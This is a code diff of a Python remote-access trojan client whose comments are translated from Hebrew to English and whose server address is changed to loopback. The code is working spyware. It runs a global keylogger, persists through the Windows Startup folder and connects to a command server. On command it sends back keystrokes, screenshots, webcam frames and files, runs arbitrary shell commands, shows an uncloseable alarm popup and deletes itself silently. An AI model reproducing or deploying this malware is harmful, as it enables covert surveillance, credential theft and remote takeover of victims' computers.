@@ -4,26 +4,27 @@ import subprocess
 import shutil
 import sys
 import time
-from PIL import ImageGrab  # <-- השינוי הגדול: משתמשים בזה במקום ב-pyautogui
+from PIL import ImageGrab  # Screen capture utility
 import io
 import struct
 import cv2
-import keyboard  # הספרייה החדשה
-import threading  # לניהול המקביליות
-import platform  # מידע על מערכת הפעלה\מחשב
-import webbrowser  # פותח דפדפן
-import ctypes  # פתיחת חלון למשתשמש
-import tkinter as tk  # ספרייה ליצירת חלונות מותאמים אישית
+import keyboard  # Global keyboard monitoring
+import threading  # Thread management
+import platform  # Platform metadata gathering
+import webbrowser  # Browser interaction
+import ctypes  # Windows API access
+import tkinter as tk  # GUI toolkit
 
-# --- הגדרות ---
-TARGET_IP = "10.100.102.9"
+# --- Configuration ---
+# --- Configuration ---
+TARGET_IP = "127.0.0.1"  # local testing loopback
 TARGET_PORT = 9998
 
-# --- משתנים גלובליים לניהול שפה וטקסט ---
-keylog_storage = ""  # פה נשמר הטקסט הנקי
-is_hebrew_mode = False  # האם אנחנו כרגע במצב עברית?
+# --- Global States ---
+keylog_storage = ""  # Buffer for captured keystrokes
+is_hebrew_mode = False  # Hebrew layout active state
 
-# --- המילון: המרת מקלדת אנגלית לעברית ---
+# --- Keyboard Mapping (QWERTY to Hebrew) ---
 ENG_TO_HEB = {
     'q': '/', 'w': "'", 'e': 'ק', 'r': 'ר', 't': 'א', 'y': 'ט', 'u': 'ו', 'i': 'ן', 'o': 'ם', 'p': 'פ',
     'a': 'ש', 's': 'ד', 'd': 'ג', 'f': 'כ', 'g': 'ע', 'h': 'י', 'j': 'ח', 'k': 'ל', 'l': 'ך', ';': 'ף',
@@ -39,28 +40,29 @@ def keylogger_engine():
         global keylog_storage
         global is_hebrew_mode
 
-        try:  # <--- הוספנו הגנה: שום דבר פה לא יקריס את התוכנה
+        try:  # Prevent hook thread crashes
             if event.event_type == keyboard.KEY_DOWN:
                 key = event.name
 
-                # --- תיקון 1: זיהוי קיצורי דרך (Ctrl/Alt + מקש) ---
+                # --- Capture hotkeys (Ctrl combos) ---
                 if keyboard.is_pressed('ctrl'):
                     if key in ['ctrl', 'right ctrl', 'left ctrl']: return
                     keylog_storage += f"[Ctrl+{key}]"
                     return
 
+                # --- Capture hotkeys (Alt combos) ---
                 if keyboard.is_pressed('alt') and key not in ['shift', 'right shift']:
                     if key in ['alt', 'right alt', 'left alt']: return
                     keylog_storage += f"[Alt+{key}]"
                     return
 
-                # --- תיקון 2: החלפת שפה ---
+                # --- Handle layout toggle (Alt+Shift) ---
                 if (key == 'shift' and keyboard.is_pressed('alt')) or \
                         (key == 'alt' and keyboard.is_pressed('shift')):
                     is_hebrew_mode = not is_hebrew_mode
                     return
 
-                # --- מקשים מיוחדים רגילים ---
+                # --- Handle whitespace and control keys ---
                 if key == 'space':
                     keylog_storage += " "
                 elif key == 'enter':
@@ -70,12 +72,10 @@ def keylogger_engine():
                 elif key in ['shift', 'caps lock', 'tab', 'right shift', 'up', 'down', 'left', 'right']:
                     pass
 
-                    # --- כתיבת אותיות ---
+                # --- Character translation logic ---
                 elif len(key) == 1:
                     char_to_add = key
-                    # תרגום לעברית רק אם המצב פעיל
                     if is_hebrew_mode:
-                        # שימוש ב-get מונע קריסה אם המקש לא במילון
                         char_to_add = ENG_TO_HEB.get(key.lower(), key)
 
                     keylog_storage += char_to_add
@@ -84,15 +84,15 @@ def keylogger_engine():
                     pass
 
         except Exception as e:
-            # אם יש שגיאה, נדפיס אותה אצלך אבל הלקוח לא יקרוס!
-            print(f"Keylogger Error (Ignored): {e}")
+            # Suppress/log hook thread exceptions
+            print(f"Keylogger Error: {e}")
 
-    # הפעלת ההאזנה
+    # Register global hook
     keyboard.hook(on_key_event)
 
 
 def become_persistent():
-    """ מעתיק את הקובץ ל-Startup """
+    """ Establishes persistence via Windows Startup folder """
     try:
         if getattr(sys, 'frozen', False):
             current_file = sys.executable
@@ -110,36 +110,33 @@ def become_persistent():
 
 
 def send_data(sock, data):
-    """ שולח מידע עם הפרדה ברורה למניעת תקיעות (גודל + תוכן) """
+    """ Sends size-prefixed data frames over TCP socket """
     if isinstance(data, str):
         data = data.encode('utf-8')
 
     data_len = len(data)
-    # אריזת הגודל (4 בייטים)
+    # Pack payload length (4-byte big-endian integer)
     header = struct.pack('>I', data_len)
 
-    # 1. שליחת הגודל
+    # 1. Send header prefix
     sock.sendall(header)
 
-    # 2. עצירה קטנטנה כדי שהשרת יספיק לעכל את הגודל
-    # זה מונע את ה"הדבקה" של הגודל והתוכן ביחד
+    # 2. Prevent socket stream coalescence
     time.sleep(0.05)
 
-    # 3. שליחת התוכן
+    # 3. Send raw payload
     sock.sendall(data)
 
 
 # -------
 def send_file_to_server(sock, filename):
-    """
-        פונקציה  אחראית על שליחת קובץ מהמחשב (לקוח) אל השרת (לשרת).
-        """
+    """ Reads local file and transmits binary payload over socket """
     if os.path.exists(filename):
         try:
             with open(filename, 'rb') as f:
                 file_data = f.read()
 
-            # שימוש ב-send_data החדש
+            # Transmit structured payload
             send_data(sock, file_data)
             return True
         except Exception as e:
@@ -153,8 +150,7 @@ def send_file_to_server(sock, filename):
 def start_client():
     global keylog_storage
 
-    # --- הפעלת ה-Keylogger ברקע ---
-    # אנחנו מפעילים אותו מיד עם תחילת התוכנית
+    # Initialize keylogger engine in background
     print("[*] Starting Keylogger in background...")
     keylogger_engine()
 
@@ -164,7 +160,6 @@ def start_client():
             my_socket.connect((TARGET_IP, TARGET_PORT))
 
             while True:
-                # עדכון: הוספנו strip() וטיפול בשגיאות כדי למנוע קריסה מרווחים
                 try:
                     command = my_socket.recv(1024).decode(errors='ignore').strip()
                 except:
@@ -177,50 +172,46 @@ def start_client():
                     my_socket.close()
                     return
 
-                # --- משיכת הלוגים (החדש!) ---
+                # --- Retrieve keylogger buffer ---
                 if command.lower() == "get_keys":
                     try:
                         if keylog_storage:
-                            # שולח את מה שנצבר
                             response = f"\n--- Keylog Dump ---\n{keylog_storage}\n-------------------"
                             send_data(my_socket, response)
-                            # מאפס את הזיכרון אחרי השליחה
-                            keylog_storage = ""
+                            keylog_storage = ""  # Reset buffer on successful exfiltration
                         else:
                             send_data(my_socket, "No keys recorded yet.")
                     except Exception as e:
                         send_data(my_socket, f"Error getting keys: {str(e)}")
-                    continue  # חובה! מונע הרצת הפקודה ב-CMD
+                    continue  # Bypass shell execution
 
-                # --- טיפול בצילום מסך  ---
+                # --- Capture screen ---
                 elif command.lower() == "screenshot":
                     try:
-                        # שימוש ב-ImageGrab
                         screenshot = ImageGrab.grab()
 
-                        # שמירה לזיכרון
+                        # Buffer image in-memory as PNG
                         img_byte_arr = io.BytesIO()
                         screenshot.save(img_byte_arr, format='PNG')
 
-                        # שליחה
+                        # Exfiltrate raw data
                         img_data = img_byte_arr.getvalue()
                         send_data(my_socket, img_data)
 
                     except Exception as e:
                         error_msg = f"Error taking screenshot: {str(e)}"
                         send_data(my_socket, error_msg)
-                    continue  # חובה! מונע הרצת הפקודה ב-CMD
+                    continue  # Bypass shell execution
 
-                # --- צילום מצלמה  ---
+                # --- Capture camera frame ---
                 if command.lower() == "cam":
                     try:
-                        # 1. פתיחת המצלמה (עם תיקון לקריסות DSHOW)
+                        # Initialize camera interface (using DirectShow API)
                         cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                         if not cap.isOpened():
                             send_data(my_socket, "Error: Webcam not found")
-                            continue  # חובה להמשיך מכאן אם נכשל
+                            continue  
 
-                        # 2. קריאת תמונה
                         ret, frame = cap.read()
                         cap.release()
 
@@ -228,12 +219,10 @@ def start_client():
                             send_data(my_socket, "Error: Failed to capture frame")
                             continue
 
-                        # 3. המרה ל-JPG בזיכרון (יעיל יותר מ-PNG לתמונות)
-                        # הפונקציה imencode מחזירה בוליאני ומערך בייטים
+                        # Compress raw frame to JPEG format for network efficiency
                         success, buffer = cv2.imencode('.jpg', frame)
 
                         if success:
-                            # 4. שליחת הבייטים לשרת
                             send_data(my_socket, buffer.tobytes())
                         else:
                             send_data(my_socket, "Error: Failed to encode image")
@@ -242,24 +231,21 @@ def start_client():
                         error_msg = f"Cam Error: {str(e)}"
                         send_data(my_socket, error_msg)
 
-                    continue  # <--- התיקון החשוב ביותר! מונע מהמחשב לנסות להריץ את "cam" כפקודה
+                    continue  # Bypass shell execution
 
-                # --- הורדת קבצים ושליחה לשרת ---
+                # --- File download ---
                 if command.lower().startswith("download "):
                     path_to_file = command[9:].strip()
                     send_file_to_server(my_socket, path_to_file)
-                    continue  # חובה!
+                    continue  
 
-                # --- פקודה לדחיסת תיקייה ---
+                # --- Directory compression ---
                 if command.lower().startswith("zip "):
                     try:
                         folder_to_zip = command[4:].strip()
 
                         if os.path.isdir(folder_to_zip):
-                            # יצירת קובץ ZIP
-                            # הפונקציה יוצרת קובץ בשם folder_to_zip.zip
                             shutil.make_archive(folder_to_zip, 'zip', folder_to_zip)
-
                             response = f"[+] Folder zipped successfully! You can now download '{folder_to_zip}.zip'"
                         else:
                             response = "[-] Error: Not a folder or directory not found."
@@ -268,16 +254,15 @@ def start_client():
                         response = f"[-] Zip Error: {str(e)}"
 
                     send_data(my_socket, response)
-                    continue  # חובה!
+                    continue  
 
-                # --- השמדה עצמית (Uninstall) שקטה ---
+                # --- Silent self-destruction protocol ---
                 if command.lower() == "terminate_all":
                     try:
-                        # 1. מחיקה מ-Startup (כדי שלא יעלה שוב)
+                        # 1. Remove persistence artifacts
                         startup_folder = os.path.join(os.getenv('APPDATA'),
                                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
 
-                        # זיהוי אם אנחנו רצים כ-EXE או כ-Script
                         if getattr(sys, 'frozen', False):
                             current_file = sys.executable
                         else:
@@ -289,26 +274,25 @@ def start_client():
                         if os.path.exists(startup_file):
                             os.remove(startup_file)
 
-                        # 2. הכנת פקודת ההתאבדות (מחכה 3 שניות ואז מוחקת)
+                        # 2. Build self-deletion command (delay execution to allow process termination)
                         destruct_cmd = f'ping 127.0.0.1 -n 3 > nul & del /f /q "{current_file}"'
 
-                        # --- החלק שהופך את זה לשקט לגמרי (Stealth) ---
+                        # 3. Suppress console window execution (Stealth mode)
                         si = subprocess.STARTUPINFO()
                         si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
-                        # מריץ את הפקודה עם ההגדרות המוסתרות (startupinfo=si)
                         subprocess.Popen(destruct_cmd, shell=True, startupinfo=si)
 
-                        # 3. הודעת פרידה וסגירה
+                        # 4. Notify C2 and terminate process
                         send_data(my_socket, "[!] Self-destruct initiated. Goodbye.")
                         my_socket.close()
-                        sys.exit(0)  # סגירה מידית כדי לשחרר את הקובץ למחיקה
+                        sys.exit(0)  
 
                     except Exception as e:
                         send_data(my_socket, f"[-] Error self-destruct: {str(e)}")
                     continue
 
-                    # --- מידע על מחשב\מערכת הפעלה של הלקוח ---
+                # --- Gather system metadata ---
                 if command.lower() == "sysinfo":
                     info = f"""
                                     --- System Info ---
@@ -321,7 +305,7 @@ def start_client():
                     send_data(my_socket, info)
                     continue
 
-                # --- הודעה נעולה (Ransomware Style Note) ---
+                # --- GUI interaction payload ---
                 if command.lower().startswith("msgbox "):
                     message = command[7:].strip()
 
@@ -329,18 +313,14 @@ def start_client():
                         try:
                             root = tk.Tk()
                             root.title("System Alert")
-
-                            # הגדרת גודל ומיקום (באמצע המסך בערך)
                             root.geometry("400x250+500+300")
 
-                            # --- הקסם: ביטול המסגרת וה-X ---
+                            # Strip window decorations
                             root.overrideredirect(True)
 
-                            # --- החלון תמיד יהיה מעל כולם ---
+                            # Set always on top
                             root.attributes("-topmost", True)
-
-                            # עיצוב ההודעה (רקע אדום, טקסט לבן - נראה מלחיץ)
-                            root.configure(bg='#8B0000')  # אדום כהה
+                            root.configure(bg='#8B0000')  
 
                             label = tk.Label(root, text=message, font=("Arial", 14, "bold"),
                                              bg='#8B0000', fg='white', wraplength=350)
@@ -350,39 +330,36 @@ def start_client():
                                                bg='#8B0000', fg='yellow')
                             warning.pack(pady=5)
 
-                            # הפונקציה שתשחרר את החלון אחרי דקה
+                            # Schedule unlock button activation
                             def unlock_window():
-                                # צליל מערכת (אופציונלי)
                                 print('\a')
-                                # יצירת כפתור סגירה
                                 btn = tk.Button(root, text="CLOSE", command=root.destroy,
                                                 font=("Arial", 12, "bold"), bg="white", fg="black", width=15)
                                 btn.pack(pady=20)
                                 warning.config(text="You can now close this window.")
 
-                            # הפעלת הטיימר: 60,000 מילישניות = 60 שניות
+                            # Set 60-second timer
                             root.after(60000, unlock_window)
 
                             root.mainloop()
                         except Exception:
                             pass
 
-                    # הרצה ב-Thread נפרד כדי לא לתקוע את השרת
+                    # Run GUI mainloop on detached thread to prevent C2 blocking
                     t = threading.Thread(target=show_locked_popup)
                     t.start()
 
                     send_data(my_socket, "[+] Locked popup displayed. User cannot close it for 60s.")
                     continue
 
-                # --- גורמת לדפדפן של הלקוח להיפתח בפתאומיות בכתובת שאתה בוחר ---
+                # --- Browser execution payload ---
                 if command.lower().startswith("openurl "):
                     url = command[8:].strip()
-                    # פתיחת הדפדפן (עובד גם אם הדפדפן סגור)
                     webbrowser.open(url)
                     send_data(my_socket, f"[+] Opened URL: {url}")
                     continue
 
-                # --- שאר הפקודות ---
+                # --- Directory traversal ---
                 if command.lower().startswith("cd "):
                     try:
                         path_to_go = command[3:].strip()
@@ -393,11 +370,11 @@ def start_client():
                     send_data(my_socket, response)
                     continue
 
-                # --- הרצת פקודות CMD (רק אם זה לא אף אחת מהפקודות המיוחדות למעלה) ---
+                # --- Subprocess shell execution ---
                 command_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 output, error = command_process.communicate()
 
-                # המרה לטקסט בטוח ומניעת קריסות עברית
+                # Handle encoding and compatibility
                 try:
                     res = output.decode('cp1255') + error.decode('cp1255')
                 except:
@@ -415,7 +392,7 @@ def start_client():
 
             print("X" * 50)
 
-            print(f"   THE REASON FOR FAILURE: {e}")
+            print(f"    THE REASON FOR FAILURE: {e}")
 
             print("X" * 50)
 
